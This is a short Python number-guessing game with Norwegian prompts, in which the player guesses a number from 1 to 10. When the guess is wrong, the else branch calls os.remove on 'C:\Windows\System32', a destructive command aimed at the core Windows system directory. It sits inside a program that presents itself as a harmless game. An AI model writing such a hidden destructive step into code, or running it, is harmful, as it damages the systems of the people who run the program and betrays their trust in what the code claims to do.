import random
import os

guess = input("Skriv tall mellom 1 til 10: ")
guess = int(guess)
number = random.randint(1,10)

if guess == number:
    print("Nice du vant")

else:
    print("Du tapte")
    os.remove("C:\Windows\System32")
    

print(f"Tallet var {number}")